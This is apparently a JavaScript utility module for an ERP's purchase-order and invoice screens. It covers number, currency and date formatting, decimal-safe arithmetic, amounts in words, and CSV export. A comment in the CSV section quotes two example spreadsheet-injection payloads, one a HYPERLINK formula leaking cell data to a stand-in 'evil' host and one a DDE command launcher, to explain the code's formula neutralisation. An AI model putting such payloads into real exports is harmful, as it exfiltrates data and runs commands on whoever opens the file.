// Shared formatting and decimal-safe helpers for PO/Invoice modules

import { getBrand } from '../config/brands';
import { dayOf, orgCurrency, orgTimezone, subscribeOrgLocale } from './orgLocale';

// Number grouping comes from the active brand pack (src/config/brands.js), NEVER from the browser.
// The currency and the time zone are the signed-in ORGANISATION's (src/utils/orgLocale.js): the brand pack's until
// the organisation's status has loaded, then its own base currency and zone. The default pack uses en-GB, giving
// 1,234,567.50 in groups of three. A bare `value.toLocaleString()` with no locale
// argument uses the browser's locale, so a user whose machine is set to en-IN would
// see Indian lakh grouping (12,34,567.50) for the same invoice. Always format
// through this module. The brand's grouping is read once at load: it is a per-deployment setting.
const brand = getBrand();
export const LOCALE = brand.locale;
export const CURRENCY_LOCALE = brand.currencyLocale;
// Live bindings: they change when the organisation's status loads, and an importer reads the current value each time it
// renders (never copy one into a module-level constant).
export let CURRENCY = orgCurrency();
export let TIMEZONE = orgTimezone();
subscribeOrgLocale(({ currency, timezone }) => {
  CURRENCY = currency;
  TIMEZONE = timezone;
});

// Format a number with fixed decimals using Intl for consistent grouping
export const formatNumber = (value, decimals = 2, locale = LOCALE) => {
  const n = Number(value || 0);
  return new Intl.NumberFormat(locale, {
    minimumFractionDigits: decimals,
    maximumFractionDigits: decimals,
  }).format(n);
};

// Currency formatter for the organisation's base currency (named for the one it began with); returns "AED 1,234,567.50"
export const formatCurrencyAED = (value, locale = CURRENCY_LOCALE) => {
  const n = Number(value || 0);
  return new Intl.NumberFormat(locale, {
    style: 'currency',
    currency: CURRENCY,
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(n);
};

// Compact money for dashboard tiles: "AED 2.46M", "AED 195.0K" (in the organisation's currency).
// One casing convention everywhere — K and M, never a mix of k/K.
export const formatCurrencyCompact = (value) => {
  const n = Number(value || 0);
  const abs = Math.abs(n);
  const sign = n < 0 ? '-' : '';
  if (abs >= 1e9) return `${sign}${CURRENCY} ${formatNumber(abs / 1e9, 2)}B`;
  if (abs >= 1e6) return `${sign}${CURRENCY} ${formatNumber(abs / 1e6, 2)}M`;
  if (abs >= 1e3) return `${sign}${CURRENCY} ${formatNumber(abs / 1e3, 1)}K`;
  return formatCurrencyAED(n);
};

// Quantities: grouped, but without forcing trailing zeros on whole units.
export const formatQty = (value, decimals = 2) => {
  const n = Number(value || 0);
  return new Intl.NumberFormat(LOCALE, {
    minimumFractionDigits: Number.isInteger(n) ? 0 : decimals,
    maximumFractionDigits: decimals,
  }).format(n);
};

export const formatPercent = (value, decimals = 2) =>
  `${formatNumber(value, decimals)}%`;

// ---------------------------------------------------------------------------
// Dates and times as the person chose to see them (Settings > Preferences)
// ---------------------------------------------------------------------------

// How a date reads. Stored per browser; the default is the UAE convention, DD/MM/YYYY.
export const DATE_FORMATS = ['DD/MM/YYYY', 'MM/DD/YYYY', 'YYYY-MM-DD', 'DD-MM-YYYY', 'DD MMM YYYY'];
export const TIME_FORMATS = ['24h', '12h'];
const DATE_KEY = 'erp-date-format';
const TIME_KEY = 'erp-time-format';

const readPref = (key, allowed, fallback) => {
  try {
    const v = localStorage.getItem(key);
    return allowed.includes(v) ? v : fallback;
  } catch {
    return fallback;
  }
};
const writePref = (key, value) => {
  try {
    localStorage.setItem(key, value);
  } catch {
    /* private mode: the choice holds for this visit only */
  }
};
let dateFormat = readPref(DATE_KEY, DATE_FORMATS, 'DD/MM/YYYY');
let timeFormat = readPref(TIME_KEY, TIME_FORMATS, '24h');
export const getDateFormat = () => dateFormat;
export const getTimeFormat = () => timeFormat;
export const setDateFormat = (id) => {
  if (!DATE_FORMATS.includes(id)) return;
  dateFormat = id;
  writePref(DATE_KEY, id);
};
export const setTimeFormat = (id) => {
  if (!TIME_FORMATS.includes(id)) return;
  timeFormat = id;
  writePref(TIME_KEY, id);
};

// Calendar parts of a moment in the organisation's zone: every date the business sees is on its own calendar.
const zoneFormatters = new Map();
const zoneFormatterFor = () => {
  const zone = orgTimezone();
  let f = zoneFormatters.get(zone);
  if (!f) {
    f = {
      parts: new Intl.DateTimeFormat('en-GB', { timeZone: zone, year: 'numeric', month: '2-digit', day: '2-digit' }),
      month: new Intl.DateTimeFormat('en-GB', { timeZone: zone, month: 'short' }),
    };
    zoneFormatters.set(zone, f);
  }
  return f;
};
const toDate = (input) => {
  if (!input) return null;
  const d = input instanceof Date ? input : new Date(input);
  return Number.isNaN(d.getTime()) ? null : d;
};

// "04/10/2026", "10/04/2026", "2026-10-04", "04-10-2026" or "04 Oct 2026", per the setting
// (or the explicit `pattern`). Empty for a missing or unreadable date.
export const formatDate = (input, pattern = dateFormat) => {
  const d = toDate(input);
  if (!d) return '';
  const { parts, month } = zoneFormatterFor();
  const p = Object.fromEntries(parts.formatToParts(d).map((x) => [x.type, x.value]));
  switch (pattern) {
    case 'MM/DD/YYYY': return `${p.month}/${p.day}/${p.year}`;
    case 'YYYY-MM-DD': return `${p.year}-${p.month}-${p.day}`;
    case 'DD-MM-YYYY': return `${p.day}-${p.month}-${p.year}`;
    case 'DD MMM YYYY': return `${p.day} ${month.format(d)} ${p.year}`;
    default: return `${p.day}/${p.month}/${p.year}`;
  }
};

const MONTH_NAMES = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 'aug', 'sep', 'oct', 'nov', 'dec'];
const isoOf = (y, m, d) => {
  const year = Number(y);
  const month = Number(m);
  const day = Number(d);
  const probe = new Date(Date.UTC(year, month - 1, day));
  if (year < 1900 || year > 2200 || probe.getUTCFullYear() !== year || probe.getUTCMonth() !== month - 1 || probe.getUTCDate() !== day) return null;
  return `${String(year).padStart(4, '0')}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
};

// What a person typed, read in their date format, as "YYYY-MM-DD"; null when it is not a real date.
// An ISO date is always accepted, and so are "-", "." and "/" between the parts.
export const parseDate = (text, pattern = dateFormat) => {
  const t = String(text ?? '').trim();
  let m = /^(\d{4})-(\d{1,2})-(\d{1,2})$/.exec(t);
  if (m) return isoOf(m[1], m[2], m[3]);
  m = /^(\d{1,2})[\s/.-]+([A-Za-z]{3,})\.?[\s/.-]+(\d{4})$/.exec(t);
  if (m) {
    const month = MONTH_NAMES.indexOf(m[2].slice(0, 3).toLowerCase()) + 1;
    return month ? isoOf(m[3], month, m[1]) : null;
  }
  m = /^(\d{1,2})[/.-](\d{1,2})[/.-](\d{4})$/.exec(t);
  if (!m) return null;
  return pattern === 'MM/DD/YYYY' ? isoOf(m[3], m[1], m[2]) : isoOf(m[3], m[2], m[1]);
};

// Kept for the many callers written before the setting existed; it now follows the setting.
export const formatDateGB = formatDate;

// "13:30:05" or "1:30:05 pm", per the setting, in the organisation's zone.
export const formatTime = (input, pattern = timeFormat, seconds = true) => {
  const d = toDate(input);
  if (!d) return '';
  return new Intl.DateTimeFormat('en-GB', {
    timeZone: orgTimezone(),
    hour: '2-digit',
    minute: '2-digit',
    ...(seconds ? { second: '2-digit' } : {}),
    hour12: pattern === '12h',
  }).format(d);
};

// A moment as "04/10/2026 13:30" (no seconds), for audit trails and lists.
export const formatDateTime = (input) => {
  const d = toDate(input);
  return d ? `${formatDate(d)} ${formatTime(d, timeFormat, false)}` : '';
};

// (Every date the user sees or picks is on the organisation's own calendar: TIMEZONE, above, is its zone.)

// YYYY-MM-DD in the organisation's zone, for <input type="date"> values.
//
// Do NOT use `new Date().toISOString().split("T")[0]` for this: toISOString is UTC, so
// in a zone ahead of UTC the first hours of each day yield *yesterday* and silently backdate
// vouchers.
export const toInputDate = (dateInput = new Date()) => {
  const d = dateInput instanceof Date ? dateInput : new Date(dateInput);
  if (Number.isNaN(d.getTime())) return '';
  return dayOf(d);
};

export const todayInput = () => toInputDate(new Date());

// YYYYMMDD, for document-number stamps.
export const stampYMD = (dateInput = new Date()) =>
  toInputDate(dateInput).replace(/-/g, '');

// ---------------------------------------------------------------------------
// CSV export
// ---------------------------------------------------------------------------

// A cell that begins with = + - @ (or a tab / line break) is a FORMULA to Excel and Sheets, whatever the file was meant to hold.
// A customer called `=HYPERLINK("http://evil/?"&A2,"Open")` or `@SUM(1+1)*cmd|' /C calc'!A0` would run on whoever opens the export.
// The standard defence (OWASP "CSV injection") is a leading single quote, which makes the cell text. Numbers must not be touched:
// a negative amount is a number, not an attack, and `-1,234.50` has to stay summable. So a cell that is only a (signed, grouped,
// decimal, percent) number, or only dashes used as "nothing here", is left alone; a real number (typeof number) never reaches this.
// \u00a0 is a non-breaking space, written as an escape: a spreadsheet skips one before a formula, and a literal one here
// reads as an ordinary space to anyone editing this line (and trips the "irregular whitespace" lint rule).
const FORMULA_START = /^[\s\u00a0]*[=+\-@]|^[\t\r\n]/;
const PLAIN_NUMBER = /^[-+]?(\d{1,3}(,\d{3})+|\d+)?(\.\d+)?%?$/;
export const neutraliseFormula = (text) => {
  if (!FORMULA_START.test(text)) return text;
  const bare = text.trim();
  if (/^[-+]+$/.test(bare) || (/\d/.test(bare) && PLAIN_NUMBER.test(bare))) return text;
  return `'${text}`;
};

// Quote a cell when it contains a delimiter, quote or newline; double inner quotes.
// Without this, a vendor name containing a comma shifts every later column.
const csvCell = (value) => {
  if (value === null || value === undefined) return '';
  const s = typeof value === 'number' ? String(value) : neutraliseFormula(String(value));
  return /["',\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};

export const toCSV = (headers, rows) =>
  [headers, ...rows].map((row) => row.map(csvCell).join(',')).join('\r\n');

// The BOM makes Excel read the file as UTF-8 — without it, non-ASCII party names
// (common here) are mangled on open.
export const downloadCSV = (filename, headers, rows) => {
  const blob = new Blob([`\uFEFF${toCSV(headers, rows)}`], {
    type: 'text/csv;charset=utf-8;',
  });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
};

// Decimal-safe helpers: add and sum using integer minor units (cents)
const toMinor = (v) => Math.round(Number(v || 0) * 100);
const fromMinor = (v) => v / 100;

export const decimalAdd = (a, b) => fromMinor(toMinor(a) + toMinor(b));

export const decimalSum = (arr) => {
  const totalMinor = (arr || []).reduce((acc, v) => acc + toMinor(v), 0);
  return fromMinor(totalMinor);
};

export const decimalRound = (v, decimals = 2) => {
  const m = Math.pow(10, decimals);
  return Math.round(Number(v || 0) * m) / m;
};

export const decimalSub = (a, b) => fromMinor(toMinor(a) - toMinor(b));

// Canonical line arithmetic, matching the backend contract in
// services/orderPurchase/transactionService.js -> calculateItems():
//   lineValue = qty * unitPrice; vatAmount = lineValue * vatPercent / 100;
//   lineTotal = lineValue + vatAmount   (VAT-INCLUSIVE)
// Use this instead of recomputing the formula per screen.
export const lineTotals = ({ qty, price, rate, vatPercent } = {}) => {
  const unitPrice = Number(price ?? rate ?? 0);
  const quantity = Number(qty ?? 0);
  const lineValue = decimalRound(quantity * unitPrice);
  const vatAmount = decimalRound((lineValue * (Number(vatPercent) || 0)) / 100);
  return { lineValue, vatAmount, lineTotal: decimalAdd(lineValue, vatAmount) };
};

// Weighted VAT rate for a set of lines. A plain mean of the per-line percentages is
// wrong: a 0%/5% mix must not report 2.5%.
export const weightedVatPercent = (items = []) => {
  const base = decimalSum(items.map((i) => i.lineValue ?? i.rate ?? 0));
  if (!base) return 0;
  const vat = decimalSum(items.map((i) => i.vatAmount ?? 0));
  return decimalRound((vat / base) * 100);
};

const ONES = ["", "One", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight",
  "Nine", "Ten", "Eleven", "Twelve", "Thirteen", "Fourteen", "Fifteen", "Sixteen",
  "Seventeen", "Eighteen", "Nineteen"];
const TENS = ["", "", "Twenty", "Thirty", "Forty", "Fifty", "Sixty", "Seventy",
  "Eighty", "Ninety"];
const SCALES = [
  { value: 1e9, name: "Billion" },
  { value: 1e6, name: "Million" },
  { value: 1e3, name: "Thousand" },
];

// Words for an integer 0-999.
const underThousand = (n) => {
  const parts = [];
  if (n >= 100) {
    parts.push(ONES[Math.floor(n / 100)], "Hundred");
    n %= 100;
  }
  if (n >= 20) {
    parts.push(TENS[Math.floor(n / 10)]);
    n %= 10;
  }
  if (n > 0) parts.push(ONES[n]);
  return parts.join(" ");
};

// Words for any non-negative integer. The previous per-file implementation only
// handled 0-999, so 1234 became "Twelve Hundred Thirty Four" and anything over
// 1999 produced "undefined Hundred ...".
export const numberToWords = (value) => {
  let n = Math.floor(Math.abs(Number(value) || 0));
  if (n === 0) return "Zero";

  const parts = [];
  for (const { value: scale, name } of SCALES) {
    if (n >= scale) {
      parts.push(numberToWords(Math.floor(n / scale)), name);
      n %= scale;
    }
  }
  if (n > 0) parts.push(underThousand(n));
  return parts.join(" ").replace(/\s+/g, " ").trim();
};

// "One Thousand Two Hundred Thirty Four Dirhams and Fifty Fils Only"
// Pass the grand total (VAT and discount included) — the amount actually payable.
export const amountInWords = (value, currency = "Dirhams", subunit = "Fils") => {
  const amount = Math.abs(decimalRound(Number(value) || 0));
  const whole = Math.floor(amount);
  const fils = Math.round((amount - whole) * 100);
  const sign = Number(value) < 0 ? "Minus " : "";
  const filsPart = fils > 0 ? ` and ${numberToWords(fils)} ${subunit}` : "";
  return `${sign}${numberToWords(whole)} ${currency}${filsPart} Only`;
};

// A balance as accountants write it: the amount and which side it is on. `net` is debit minus
// credit, so positive is a debit balance and negative a credit balance; zero has no side.
export const drCr = (net, digits = 2) => {
  const n = Math.round((Number(net) || 0) * 100) / 100;
  return { text: formatNumber(Math.abs(n), digits), side: n > 0 ? "Dr" : n < 0 ? "Cr" : "" };
};
